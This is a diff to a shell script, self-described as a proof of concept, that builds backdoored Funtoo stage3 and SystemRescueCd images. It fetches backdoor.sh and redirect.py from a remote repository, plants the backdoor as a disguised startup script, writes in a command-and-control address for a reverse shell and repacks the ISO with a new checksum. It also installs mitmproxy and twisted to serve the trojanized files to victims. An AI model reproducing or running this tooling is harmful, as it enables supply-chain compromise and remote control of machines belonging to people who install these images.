@@ -1,4 +1,7 @@
 ##########as always lots of rooms for improvement, this is just a PoC ############
+#at this point,funtoo is the only distro supported
+#####################
+
 #################### setup backdoor env.
 
 if test $1;
@@ -24,8 +27,32 @@ exit
 fi
 
 
+#include openssl,netcat,wget here if they aren't installed
 
-emerge pip cdrtools #include openssl,netcat,wget here if they aren't installed
+
+PORTAGE="emerge pip cdrtools squashfs-tools"
+APT="apt-get install python-pip squashfs-tools genisoimage"
+YUM="yum install python-pip squashfs-tools mkisofs cdrtools"
+
+if  emerge > /dev/null 2>&1
+then
+eval $PORTAGE
+
+else if apt-get > /dev/null 2>&1
+then
+eval $APT
+
+else if  yum > /dev/null 2>&1
+then
+eval $YUM
+else
+ echo "No compatible package manager found...good luck,will try to finish anyways...."
+fi
+fi
+fi
+
+
+
 pip install mitmproxy twisted
 
 #ideally you will set this up on your own system and just wget the backdoored stage3 and iso
@@ -33,6 +60,9 @@ pip install mitmproxy twisted
 
 mkdir work
 cd work
+
+## good spot to insert per-distro conditionals in the future.
+
 mkdir backdoor-stage3 backdoor-iso-ro backdoor-iso-rw out
 
 wget http://build.funtoo.org/funtoo-current/x86-64bit/generic_64/stage3-latest.tar.xz #replace with current stage3 url
@@ -43,8 +73,10 @@ cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/
 tar -C backdoor-stage3 -xvf ./stage3-latest.tar.xz
 unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat
 
+curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/redirect.py > redirect.py
 curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/backdoor.sh > backdoor-stage3/etc/local.d/' '
 sed -i "s/REPLACEME/$CNC/" backdoor-stage3/etc/local.d/' '
+sed -i "s/REPLACEME/$CNC/" redirect.py
 
 #make sure the IP contained is the IP your reverse shell handler is listening on
 
@@ -65,7 +97,11 @@ cd ../backdoor-iso-rw
 rm sysrcd*
 mv ../sysrcd-backdoored.dat ./sysrcd.dat
 md5sum sysrcd.dat > sysrcd.md5
+if test mkisofs
+then
 mkisofs -o ../out/systemrescuecd-x86-4.7.1.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V systemrescuecd-x86-4.7.1 .
+else
+genisoimage -o ../out/systemrescuecd-x86-4.7.1.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V systemrescuecd-x86-4.7.1 .
 
 cd ..;ls -l out
 ########start and fork twisted web server to host the backdoored files###
